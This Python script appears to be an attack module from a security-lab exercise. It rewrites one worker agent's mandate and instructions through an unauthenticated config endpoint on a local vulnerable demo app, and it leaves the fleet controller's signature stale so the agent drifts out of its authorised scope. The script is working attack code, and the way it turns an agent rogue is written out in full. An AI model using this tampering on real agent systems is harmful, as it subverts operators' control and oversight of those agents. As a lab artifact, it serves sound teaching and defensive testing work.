#!/usr/bin/env python3
"""Attack skill — turn one worker agent rogue by editing its mandate config.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Fetches the live config of one agent (default ``billy-stock``) with
``GET /config/<agent>``, replaces its ``mandate`` and ``instructions`` with the
fields in ``assets/tampered_mandate.json``, and writes it back through the
unauthenticated ``POST /config``. The edit widens the mandate and adds two
standing orders that start on different ticks, so the agent drifts out of
scope over the run. The fleet controller's signature is left as it was, and
no longer matches. Nothing executes until the scheduler runs the next tick;
every action is simulated, an entry in the target's in-memory action log.

Exit code: 0 when the config was written, 1 when the target is unreachable.

Examples:
    python scripts/run_mandate_tamper.py
    python scripts/run_mandate_tamper.py --agent billy-stock --payload assets/tampered_mandate.json
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request
from typing import Any, Dict

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("ASI10_TARGET", "http://127.0.0.1:5310")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "tampered_mandate.json")


def _get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=10) as resp:
        return json.loads(resp.read())


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "asi10"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the ASI10 target. Start it: python vulnerable_app.py")
    return ok


def load_payload(path: str) -> Dict[str, Any]:
    with open(path, "r", encoding="utf-8") as fh:
        return json.load(fh)


def apply_edit(live: Dict[str, Any], payload: Dict[str, Any]) -> Dict[str, Any]:
    """The edit: swap mandate and instructions, keep everything else (signature included)."""
    edited = dict(live)
    edited["mandate"] = payload["mandate"]
    edited["instructions"] = payload["instructions"]
    return edited


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--agent", default=None, help="agent to edit (default: the payload's 'agent')")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="mandate edit to apply")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    payload = load_payload(args.payload)
    agent = args.agent or payload.get("agent", "billy-stock")

    live = _get(f"{args.target}/config/{agent}")["config"]
    edited = apply_edit(live, payload)
    print(f"[*] Editing {agent}'s mandate config with {os.path.basename(args.payload)} "
          f"(unauthenticated POST /config)")
    _post(f"{args.target}/config", {"agent": agent, "config": edited})
    added = [a for a in edited["mandate"]["actions"] if a not in live["mandate"]["actions"]]
    print(f"[+] Config saved. 1 agent changed; mandate widened by {', '.join(added) or 'nothing'}; "
          "signature left stale.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect over the next ticks.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
